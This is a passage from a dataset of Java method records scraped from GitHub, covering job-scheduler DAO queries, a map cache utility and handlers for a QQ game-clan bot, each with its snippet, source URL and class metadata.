"modifiers": ["public"], "return_type": "String", "snippet": "  public String getJobId() {    return this.jobId;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/event/BlockingStatus.java", "stars": "18", "class": {"name": "BlockingStatus", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getInformation", "params": ["ConfigGenerator"], "throws": null, "modifiers": ["public", "static"], "return_type": "Optional<ConfigGenerator>", "snippet": "    public static Optional<ConfigGenerator.Information> getInformation(ConfigGenerator generator) {        for (Method method : generator.getClass().getDeclaredMethods()) {            if (method.isAnnotationPresent(ConfigGenerator.Information.class)) {                return Optional.of(method.getAnnotation(ConfigGenerator.Information.class));            }        }        return Optional.empty();    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slib/config/builder/ConfigBuilder.java", "stars": "3", "class": {"name": "ConfigBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getInformations", "params": ["ConfigGenerator"], "throws": null, "modifiers": ["public", "static"], "return_type": "List<ConfigGenerator>", "snippet": "    public static List<ConfigGenerator.Information> getInformations(ConfigGenerator generator) {        List<ConfigGenerator.Information> list = new ArrayList<>();        for (Method method : generator.getClass().getDeclaredMethods()) {            if (method.isAnnotationPresent(ConfigGenerator.Information.class)) {                list.add(method.getAnnotation(ConfigGenerator.Information.class));            }        }        return list;    }", "url": "https://raw.githubusercontent.com/Silthus/sLimits/master/src/main/java/net/silthus/slib/config/builder/ConfigBuilder.java", "stars": "3", "class": {"name": "ConfigBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "pageList", "params": ["int", "int", "int", "int", "String", "String", "String"], "throws": null, "modifiers": ["public"], "return_type": "List<XxlJobInfo>", "snippet": "    public List<XxlJobInfo> pageList(int offset, int pagesize, int jobGroup, int triggerStatus,                                     String jobDesc, String executorHandler, String author) {        Query query = pageListQuery(offset, pagesize, jobGroup, triggerStatus, jobDesc, executorHandler, author);        return super.find(query);    }", "url": "https://raw.githubusercontent.com/miaoo92/xxl-job-mongo/master/src/main/java/com/avon/rga/dao/XxlJobInfoService.java", "stars": "1", "class": {"name": "XxlJobInfoService", "extends": "BaseMongoServiceImpl", "implements": null, "modifiers": ["public"]}}, {"method_name": "pageListCount", "params": ["int", "int", "int", "int", "String", "String", "String"], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long pageListCount(int offset, int pagesize, int jobGroup, int triggerStatus,                              String jobDesc, String executorHandler, String author) {        Query query = pageListQuery(offset, pagesize, jobGroup, triggerStatus, jobDesc, executorHandler, author);        return super.count(query);    }", "url": "https://raw.githubusercontent.com/miaoo92/xxl-job-mongo/master/src/main/java/com/avon/rga/dao/XxlJobInfoService.java", "stars": "1", "class": {"name": "XxlJobInfoService", "extends": "BaseMongoServiceImpl", "implements": null, "modifiers": ["public"]}}, {"method_name": "loadById", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "XxlJobInfo", "snippet": "    public XxlJobInfo loadById(int id) {        Query query = new Query(where(\"id\").is(id));        return super.findOne(query);    }", "url": "https://raw.githubusercontent.com/miaoo92/xxl-job-mongo/master/src/main/java/com/avon/rga/dao/XxlJobInfoService.java", "stars": "1", "class": {"name": "XxlJobInfoService", "extends": "BaseMongoServiceImpl", "implements": null, "modifiers": ["public"]}}, {"method_name": "update", "params": ["XxlJobInfo"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int update(XxlJobInfo xxlJobInfo) {        Query query = new Query(where(\"_id\").is(xxlJobInfo.getId()));        Update update = new Update();        update.set(\"jobGroup\", xxlJobInfo.getJobGroup());        update.set(\"jobCron\", xxlJobInfo.getJobCron());        update.set(\"jobDesc\", xxlJobInfo.getJobDesc());        update.set(\"addTime\", xxlJobInfo.getAddTime());        update.set(\"updateTime\", xxlJobInfo.getUpdateTime());        update.set(\"author\", xxlJobInfo.getAuthor());        update.set(\"alarmEmail\", xxlJobInfo.getAlarmEmail());        update.set(\"executorRouteStrategy\", xxlJobInfo.getExecutorRouteStrategy());        update.set(\"executorHandler\", xxlJobInfo.getExecutorHandler());        update.set(\"executorParam\", xxlJobInfo.getExecutorParam());        update.set(\"executorBlockStrategy\", xxlJobInfo.getExecutorBlockStrategy());        update.set(\"executorTimeout\", xxlJobInfo.getExecutorTimeout());        update.set(\"executorFailRetryCount\", xxlJobInfo.getExecutorFailRetryCount());        update.set(\"glueType\", xxlJobInfo.getGlueType());        update.set(\"glueSource\", xxlJobInfo.getGlueSource());        update.set(\"glueRemark\", xxlJobInfo.getGlueRemark());        update.set(\"glueUpdatetime\", xxlJobInfo.getGlueUpdatetime());        update.set(\"childJobId\", xxlJobInfo.getChildJobId());        update.set(\"triggerStatus\", xxlJobInfo.getTriggerStatus());        update.set(\"triggerLastTime\", xxlJobInfo.getTriggerLastTime());        update.set(\"triggerNextTime\", xxlJobInfo.getTriggerNextTime());        UpdateResult update1 = super.update(query, update);        return (int) update1.getModifiedCount();    }", "url": "https://raw.githubusercontent.com/miaoo92/xxl-job-mongo/master/src/main/java/com/avon/rga/dao/XxlJobInfoService.java", "stars": "1", "class": {"name": "XxlJobInfoService", "extends": "BaseMongoServiceImpl", "implements": null, "modifiers": ["public"]}}, {"method_name": "delete", "params": ["long"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int delete(long id) {        Query query = new Query(where(\"_id\").is(id));        DeleteResult remove = super.remove(query);        return (int) remove.getDeletedCount();    }", "url": "https://raw.githubusercontent.com/miaoo92/xxl-job-mongo/master/src/main/java/com/avon/rga/dao/XxlJobInfoService.java", "stars": "1", "class": {"name": "XxlJobInfoService", "extends": "BaseMongoServiceImpl", "implements": null, "modifiers": ["public"]}}, {"method_name": "getJobsByGroup", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "List<XxlJobInfo>", "snippet": "    public List<XxlJobInfo> getJobsByGroup(int jobGroup) {        Query query = new Query(where(\"jobGroup\").is(jobGroup));        return super.find(query);    }", "url": "https://raw.githubusercontent.com/miaoo92/xxl-job-mongo/master/src/main/java/com/avon/rga/dao/XxlJobInfoService.java", "stars": "1", "class": {"name": "XxlJobInfoService", "extends": "BaseMongoServiceImpl", "implements": null, "modifiers": ["public"]}}, {"method_name": "findAllCount", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int findAllCount() {        return (int) super.count(new Query(where(\"_id\").exists(true)));    }", "url": "https://raw.githubusercontent.com/miaoo92/xxl-job-mongo/master/src/main/java/com/avon/rga/dao/XxlJobInfoService.java", "stars": "1", "class": {"name": "XxlJobInfoService", "extends": "BaseMongoServiceImpl", "implements": null, "modifiers": ["public"]}}, {"method_name": "scheduleJobQuery", "params": ["long", "int"], "throws": null, "modifiers": ["public"], "return_type": "List<XxlJobInfo>", "snippet": "    public List<XxlJobInfo> scheduleJobQuery(long maxNextTime, int pagesize) {        Query query = new Query();        query.addCriteria(where(\"triggerStatus\").is(1));        query.addCriteria(where(\"triggerNextTime\").lte(maxNextTime));        query.limit(pagesize);        query.with(new Sort(Sort.Direction.ASC, \"_id\"));        return super.find(query);    }", "url": "https://raw.githubusercontent.com/miaoo92/xxl-job-mongo/master/src/main/java/com/avon/rga/dao/XxlJobInfoService.java", "stars": "1", "class": {"name": "XxlJobInfoService", "extends": "BaseMongoServiceImpl", "implements": null, "modifiers": ["public"]}}, {"method_name": "scheduleUpdate", "params": ["XxlJobInfo"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int scheduleUpdate(XxlJobInfo xxlJobInfo) {        Update update = new Update();        update.set(\"triggerLastTime\", xxlJobInfo.getTriggerLastTime());        update.set(\"triggerNextTime\", xxlJobInfo.getTriggerNextTime());        update.set(\"triggerStatus\", xxlJobInfo.getTriggerStatus());        Query query = new Query(where(\"_id\").is(xxlJobInfo.getId()));        UpdateResult update1 = super.update(query, update);        return (int) update1.getModifiedCount();    }", "url": "https://raw.githubusercontent.com/miaoo92/xxl-job-mongo/master/src/main/java/com/avon/rga/dao/XxlJobInfoService.java", "stars": "1", "class": {"name": "XxlJobInfoService", "extends": "BaseMongoServiceImpl", "implements": null, "modifiers": ["public"]}}, {"method_name": "pageListQuery", "params": ["int", "int", "int", "int", "String", "String", "String"], "throws": null, "modifiers": ["private"], "return_type": "Query", "snippet": "    private Query pageListQuery(int offset, int pagesize, int jobGroup, int triggerStatus,                                String jobDesc, String executorHandler, String author) {        Query query = new Query();        if (jobGroup > 0) {            query.addCriteria(where(\"jobGroup\").is(jobGroup));        }        if (triggerStatus >= 0) {            query.addCriteria(where(\"triggerStatus\").is(triggerStatus));        }        if (StringUtils.isNotEmpty(jobDesc)) {            query.addCriteria(where(\"jobDesc\").regex(jobDesc));        }        if (StringUtils.isNotEmpty(executorHandler)) {            query.addCriteria(where(\"executorHandler\").regex(executorHandler));        }        if (StringUtils.isNotEmpty(author)) {            query.addCriteria(where(\"author\").regex(author));        }        query.skip(offset);        query.limit(pagesize);        return query;    }", "url": "https://raw.githubusercontent.com/miaoo92/xxl-job-mongo/master/src/main/java/com/avon/rga/dao/XxlJobInfoService.java", "stars": "1", "class": {"name": "XxlJobInfoService", "extends": "BaseMongoServiceImpl", "implements": null, "modifiers": ["public"]}}, {"method_name": "single", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "MapCache", "snippet": "    public static MapCache single() {        return INS;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/utils/MapCache.java", "stars": "2", "class": {"name": "MapCache", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "get", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "T", "snippet": "    public <T> T get(String key) {        CacheObject cacheObject = cachePool.get(key);        if (null != cacheObject) {            long cur = System.currentTimeMillis() / 1000;            if (cacheObject.getExpired() <= 0 || cacheObject.getExpired() > cur) {                Object result = cacheObject.getValue();                return (T) result;            }        }        return null;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/utils/MapCache.java", "stars": "2", "class": {"name": "MapCache", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "hget", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "T", "snippet": "    public <T> T hget(String key, String field) {        key = key + \":\" + field;        return this.get(key);    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/utils/MapCache.java", "stars": "2", "class": {"name": "MapCache", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "set", "params": ["String", "Object"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void set(String key, Object value) {        this.set(key, value, -1);    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/utils/MapCache.java", "stars": "2", "class": {"name": "MapCache", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "set", "params": ["String", "Object", "long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void set(String key, Object value, long expired) {        expired = expired > 0 ? System.currentTimeMillis() / 1000 + expired : expired;        CacheObject cacheObject = new CacheObject(key, value, expired);        cachePool.put(key, cacheObject);    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/utils/MapCache.java", "stars": "2", "class": {"name": "MapCache", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "hset", "params": ["String", "String", "Object"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void hset(String key, String field, Object value) {        this.hset(key, field, value, -1);    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/utils/MapCache.java", "stars": "2", "class": {"name": "MapCache", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "hset", "params": ["String", "String", "Object", "long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void hset(String key, String field, Object value, long expired) {        key = key + \":\" + field;        expired = expired > 0 ? System.currentTimeMillis() / 1000 + expired : expired;        CacheObject cacheObject = new CacheObject(key, value, expired);        cachePool.put(key, cacheObject);    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/utils/MapCache.java", "stars": "2", "class": {"name": "MapCache", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "del", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void del(String key) {        cachePool.remove(key);    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/utils/MapCache.java", "stars": "2", "class": {"name": "MapCache", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "hdel", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void hdel(String key, String field) {        key = key + \":\" + field;        this.del(key);    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/utils/MapCache.java", "stars": "2", "class": {"name": "MapCache", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "clean", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void clean() {        cachePool.clear();    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/utils/MapCache.java", "stars": "2", "class": {"name": "MapCache", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getKey", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String getKey() {            return key;        }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/utils/MapCache.java", "stars": "2", "class": {"name": "CacheObject", "extends": null, "implements": null, "modifiers": ["static"]}}, {"method_name": "getValue", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "        public Object getValue() {            return value;        }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/utils/MapCache.java", "stars": "2", "class": {"name": "CacheObject", "extends": null, "implements": null, "modifiers": ["static"]}}, {"method_name": "getExpired", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "        public long getExpired() {            return expired;        }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/utils/MapCache.java", "stars": "2", "class": {"name": "CacheObject", "extends": null, "implements": null, "modifiers": ["static"]}}, {"method_name": "testListen1", "params": ["GroupMsg", "MsgSender"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void testListen1(GroupMsg msg, MsgSender sender) {        sender.SENDER.sendGroupMsg(msg.getGroupCode(), helpMsg);    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/CoolQ/Listener/prcnessListener.java", "stars": "2", "class": {"name": "prcnessListener", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testListen", "params": ["PrivateMsg", "MsgSender"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void testListen(PrivateMsg msg, MsgSender sender) {        sender.SENDER.sendPrivateMsg(msg, helpMsg);    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/CoolQ/Listener/prcnessListener.java", "stars": "2", "class": {"name": "prcnessListener", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "createGroup", "params": ["GroupMsg", "MsgSender"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void createGroup(GroupMsg msg, MsgSender sender){        robotQQ= msg.getThisCode();        String str=msg.getMsg();        int atNum=searchAtNumber(str);        String groupMasterQQ=null;        String groupName=null;        String gameName=null;        String[] strings=msg.getMsg().split(\" +\");        Date date=new Date();        SimpleDateFormat df = new SimpleDateFormat(dateFormat);//\u8bbe\u7f6e\u65e5\u671f\u683c\u5f0f        Group group=new Group();        group.setCreateDate(df.format(date));        group.setGroupid(msg.getGroupCode());        //\u6682\u65f6\u4e0d\u652f\u6301\u66ff\u522b\u4eba\u5efa\u4f1a        if(strings.length>4){            sender.SENDER.sendGroupMsg(msg.getGroupCode(), tips_error);            return;        }        try {            gameName=strings[3];//\u4f1a\u957f\u540d\u5b57            if(atNum>2){                sender.SENDER.sendGroupMsg(msg.getGroupCode(), tips_error);                return;            }else if(atNum==1){//\u53ea\u6709at\u4e86\u673a\u5668\u4eba                groupMasterQQ=msg.getQQ();                groupName=strings[2];//\u5de5\u4f1a\u540d\u5b57                group.setGroupName(groupName);                group.setGroupMasterQQ(groupMasterQQ);                DB.Instance.creatGroup(group,gameName);                teamMember teamMember = new teamMember(groupMasterQQ, true, null, strings[3]);                DB.Instance.joinGroup(teamMember, group.getGroupid());                sender.SENDER.sendGroupMsg(msg.getGroupCode(), groupName + \" \u5de5\u4f1a\u5df2\u7ecf\u521b\u5efa\u597d\u8fa3\");            }//            else {//\u6709at\u5176\u4ed6\u4eba//                groupMasterQQ=strings[4].substring(10,strings[4].indexOf(\"]\"));//                groupName=strings[2];//\u5de5\u4f1a\u540d\u5b57//                group.setGroupName(groupName);//                group.setGroupMasterQQ(groupMasterQQ);//                gameName=null;//                teamMember teamMember=new teamMember(msg.getQQCode(),false,null,strings[3]);//                System.out.println(group); System.out.println(gameName);System.out.println(teamMember);//                //DB.Instance.creatGroup(group,gameName,teamMember);//            }        }catch (IndexOutOfBoundsException e){            e.printStackTrace();            sender.SENDER.sendGroupMsg(msg.getGroupCode(), tips_error);        }    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/CoolQ/Listener/prcnessListener.java", "stars": "2", "class": {"name": "prcnessListener", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getGroups", "params": ["GroupMsg", "MsgSender"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void getGroups(GroupMsg msg, MsgSender sender) {        if (DB.Instance.powerCheck(msg.getQQCode(), msg.getGroupCode())) {            CQCodeUtil cqCodeUtil = CQCodeUtil.build();            List<String> strings = cqCodeUtil.getCQCodeStrFromMsgByType(msg.getMsg(), CQCodeTypes.at);            int[] sum = {0, 0, 0};//\u5df2\u6709\u5de5\u4f1a\uff0c\u6210\u529f\u5165\u4f1a,\u9519\u8bef\u672a\u52a0\u5165            ArrayList<String> have = new ArrayList<>();            ArrayList<String> success = new ArrayList<>();            ArrayList<String> error = new ArrayList<>();            for (String s : strings) {                teamMember teamMember = new teamMember(s.substring(10, s.length() - 1), false, null, pcrGroupMap.get(s));                switch (DB.Instance.joinGroup(teamMember, msg.getGroupCode())) {                    case -1:                    case 3:                    case 1:                        sum[2]++;//\u9519\u8bef                        error.add(teamMember.getUserQQ());                        break;                    case 0:                        sum[0]++;//\u5df2\u6709\u5de5\u4f1a                        have.add(teamMember.getUserQQ());                        break;                    case 2:                        sum[1]++;//\u6210\u529f\u52a0\u5165                        success.add(teamMember.getUserQQ());                        break;                }            }            StringBuilder stringBuilder = new StringBuilder();            stringBuilder.append(\"\u672c\u6b21\u64cd\u4f5c\uff0c\u6210\u529f\u5165\u4f1a\uff1a\").append(sum[1]).append(\"\u4eba\");            for (String s : success) {                stringBuilder.append(\"[CQ:at,qq=\").append(s).append(\"]\");            }            stringBuilder.append(\"\\n\u5df2\u6709\u5de5\u4f1a\uff1a\").append(sum[0]).append(\"\u4eba\");            for (String s : have) {                stringBuilder.append(\"[CQ:at,qq=\").append(s).append(\"]\");            }            stringBuilder.append(\"\\n\u9519\u8bef\u672a\u52a0\u5165\uff1a\").append(sum[2]).append(\"\u4eba\\n\");            for (String s : error) {                stringBuilder.append(\"[CQ:at,qq=\").append(s).append(\"]\");            }            sender.SENDER.sendGroupMsg(msg.getGroupCode(), stringBuilder.toString());            return;        }        sender.SENDER.sendGroupMsg(msg.getGroupCode(), notPower);    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/CoolQ/Listener/prcnessListener.java", "stars": "2", "class": {"name": "prcnessListener", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getGroup", "params": ["GroupMsg", "MsgSender"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void getGroup(GroupMsg msg, MsgSender sender){        teamMember teamMember = new teamMember(msg.getQQCode(), false, null, getVar(msg.getMsg()));        switch (DB.Instance.joinGroup(teamMember,msg.getGroupCode())){            case -1:                sender.SENDER.sendGroupMsg(msg.getGroupCode(), error);//\u9519\u8bef                break;            case 0:                sender.SENDER.sendGroupMsg(msg.getGroupCode(), isHaveGroup);//\u5df2\u6709\u5de5\u4f1a                break;            case 1:                sender.SENDER.sendGroupMsg(msg.getGroupCode(), isFullGroup);//\u5de5\u4f1a\u6ee1\u5458                break;            case 2:                sender.SENDER.sendGroupMsg(msg.getGroupCode(), successJoinGroup);//\u6210\u529f\u52a0\u5165                break;            case 3:                sender.SENDER.sendGroupMsg(msg.getGroupCode(), noThisGroup);//\u6210\u529f\u52a0\u5165                break;        }    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/CoolQ/Listener/prcnessListener.java", "stars": "2", "class": {"name": "prcnessListener", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "outGroup", "params": ["GroupMsg", "MsgSender"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void outGroup(GroupMsg msg, MsgSender sender){        switch (DB.Instance.outGroup(msg.getQQCode())){            case -1:                sender.SENDER.sendGroupMsg(msg.getGroupCode(), error);                break;            case 0:                if (DB.Instance.isSuperPower(msg.getGroupCode(), msg.getQQCode())) {//\u4f1a\u957f\u5219\u9500\u6bc1\u5de5\u4f1a                    DB.Instance.dropGroup(msg.getGroupCode());                    sender.SENDER.sendGroupMsg(msg.getGroupCode(), successDropGroup);                    return;                }                sender.SENDER.sendGroupMsg(msg.getGroupCode(), successOutGroup);                break;            case 1:                sender.SENDER.sendGroupMsg(msg.getGroupCode(), noGroupOutGroup);                break;        }    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/CoolQ/Listener/prcnessListener.java", "stars": "2", "class": {"name": "prcnessListener", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "changeSuperPower", "params": ["GroupMsg", "MsgSender"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void changeSuperPower(GroupMsg msg, MsgSender sender) {        CQCodeUtil cqCodeUtil = CQCodeUtil.build();        List<String> strings = cqCodeUtil.getCQCodeStrFromMsgByType(msg.getMsg(), CQCodeTypes.at);        if (DB.Instance.isSuperPower(msg.getGroupCode(), msg.getQQCode()) && strings.size() > 0) {            switch (DB.Instance.changeGroupMaster(msg.getQQCode(), strings.get(0).substring(10, strings.get(0).length() - 1))) {                case -1:                    sender.SENDER.sendGroupMsg(msg.getGroupCode(), noFindTheOne);                    break;                case 1:                    sender.SENDER.sendGroupMsg(msg.getGroupCode(), \"\u5979\u5728\u522b\u7684\u5de5\u4f1a\u54ce\uff0c\u4e3a\u4ec0\u4e48\u4f1a\u53d8\u6210\u8fd9\u6837\u5462\");                    break;                case 2:                    sender.SENDER.sendGroupMsg(msg.getGroupCode(), successChangeSuperPower);                    break;            }        } else {            sender.SENDER.sendGroupMsg(msg.getGroupCode(), \"\u6ca1\u6709\u4f1a\u957f\u6743\u9650\");        }    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/CoolQ/Listener/prcnessListener.java", "stars": "2", "class": {"name": "prcnessListener", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "downAdmin", "params": ["GroupMsg", "MsgSender"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void downAdmin(GroupMsg msg, MsgSender sender) {        CQCodeUtil cqCodeUtil = CQCodeUtil.build();        List<String> strings = cqCodeUtil.getCQCodeStrFromMsgByType(msg.getMsg(), CQCodeTypes.at);        if (DB.Instance.isSuperPower(msg.getGroupCode(), msg.getQQCode()) && strings.size() > 0) {            switch (DB.Instance.changeGroupMaster(msg.getQQCode(), strings.get(0).substring(10, strings.get(0).length() - 1))) {                case -1:                    sender.SENDER.sendGroupMsg(msg.getGroupCode(), noFindTheOne);                    break;                case 1:                    sender.SENDER.sendGroupMsg(msg.getGroupCode(), \"\u5979\u5728\u522b\u7684\u5de5\u4f1a\u54ce\uff0c\u4e3a\u4ec0\u4e48\u4f1a\u53d8\u6210\u8fd9\u6837\u5462\");                    break;                case 2:                    sender.SENDER.sendGroupMsg(msg.getGroupCode(), successChangeSuperPower);                    break;            }        } else {            sender.SENDER.sendGroupMsg(msg.getGroupCode(), \"\u6ca1\u6709\u4f1a\u957f\u6743\u9650\");        }    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/CoolQ/Listener/prcnessListener.java", "stars": "2", "class": {"name": "prcnessListener", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "searchVoidKnife", "params": ["GroupMsg", "MsgSender"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void searchVoidKnife(GroupMsg msg, MsgSender sender){        CQCodeUtil cqCodeUtil = CQCodeUtil.build();        List<String> strings = cqCodeUtil.getCQCodeStrFromMsgByType(msg.getMsg(), CQCodeTypes.at);        HashMap<String, Integer> map;        StringBuilder src = new StringBuilder();        if (strings != null && strings.size() > 0) {            map = new HashMap<>();            for (String QQ : strings) {                map.putAll(DB.getInstance().searchVoidKnifeByGroup(QQ, 2));            }        } else {            map = DB.getInstance().searchVoidKnifeByGroup(msg.getGroupCode(), 1);        }        Set<String> set = map.keySet();        src = new StringBuilder(\"\u7edf\u8ba1\u5982\u4e0b:\\n\");        int flag;        for (String s : set) {            flag = map.get(s);            if (flag > 0) {                src.append(\"[CQ:at,qq=\" + s + \"] ,\u6ca1\u51fa\" + flag + \"\u5200\\n\");            }        }        sender.SENDER.sendGroupMsg(msg.getGroupCode(), src.toString());    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/CoolQ/Listener/prcnessListener.java", "stars": "2", "class": {"name": "prcnessListener", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "searchKnife", "params": ["GroupMsg", "MsgSender"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void searchKnife(GroupMsg msg, MsgSender sender) {        List<Knife> list = new ArrayList<>();        CQCodeUtil cqCodeUtil = CQCodeUtil.build();        List<String> strings = cqCodeUtil.getCQCodeStrFromMsgByType(msg.getMsg(), CQCodeTypes.at);        StringBuilder stringBuilder = new StringBuilder();        Date date = new Date();        SimpleDateFormat df = new SimpleDateFormat(dateFormat);//\u8bbe\u7f6e\u65e5\u671f\u683c\u5f0f        if (strings != null && strings.size() > 0) {            //\u627e \u4eba\u7684\u51fa\u5200            for (String s : strings) {                System.out.println(s);                list.addAll(DB.getInstance().searchKnife(s.substring(10, strings.get(0).length() - 1), null, df.format(date)));            }        } else {            //\u627e\u6574\u4e2a\u5de5\u4f1a\u7684\u51fa\u5200            list = DB.getInstance().searchKnife(null, msg.getGroupCode(), df.format(date));        }        if (list != null) {            stringBuilder.append(\"\u51fa\u5200\u4fe1\u606f\uff1a\");            for (Knife knife : list) {                stringBuilder.append(\"\\n-----\\n\u7f16\u53f7: \").append(knife.getId());                stringBuilder.append(\"\\n\u6635\u79f0\uff1a\").append(DB.Instance.searchName(knife.getKnifeQQ()));                stringBuilder.append(\"\\n\u6263\u6263\uff1a\").append(knife.getKnifeQQ());                stringBuilder.append(\"\\n\u4f24\u5bb3\uff1a\").append(knife.getHurt());                stringBuilder.append(\"\\n\u5468\u76ee\").append(knife.getNo() / 10);                stringBuilder.append(\",\").append(knife.getNo() - (knife.getNo() / 10) * 10).append(\"\u738b\");            }            sender.SENDER.sendPrivateMsg(msg.getQQCode(), stringBuilder.toString());        } else {            sender.SENDER.sendPrivateMsg(msg.getQQCode(), \"\u8fd8\u6ca1\u6709\u5200\u4fe1\u606f\u54e6\");        }    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/CoolQ/Listener/prcnessListener.java", "stars": "2", "class": {"name": "prcnessListener", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "AllCoolDown", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void AllCoolDown() {        coolDown = new HashMap<>();    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/CoolQ/Listener/prcnessListener.java", "stars": "2", "class": {"name": "prcnessListener", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getKnife", "params": ["GroupMsg", "MsgSender"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void getKnife(GroupMsg msg, MsgSender sender){        FightStatue fightStatue=DB.Instance.searchFightStatue(msg.getQQCode());        if(fightStatue!=null){            switch (DB.getInstance().joinTree(msg.getQQCode())) {                case -1:                    sender.SENDER.sendGroupMsg(msg.getGroupCode(), \"\u597d\u50cf\u51fa\u4e86\u70b9\u4ec0\u4e48\u72b6\u51b5\");                    break;                case 1:                    sender.SENDER.sendGroupMsg(msg.getGroupCode(),\"\u00bf,\u4ed6\u7fa4\u95f4\u8c0d\u53d1\u73b0\uff0c\u5efa\u8baerbq\u4e00\u5468\" );                    break;                case 2:                    sender.SENDER.sendGroupMsg(msg.getGroupCode(), \"\u00bf,\u6253\u54a9\uff0c\u8fd8\u5728\u51fa\u5200\u8fd9\u4e48\u53c8\u51fa\u5200\u4e86\");                    break;                case 3:                    sender.SENDER.sendGroupMsg(msg.getGroupCode(), \"\u5df2\u51fa\u5200\");                    break;            }        }else {            sender.SENDER.sendGroupMsg(msg.getGroupCode(), 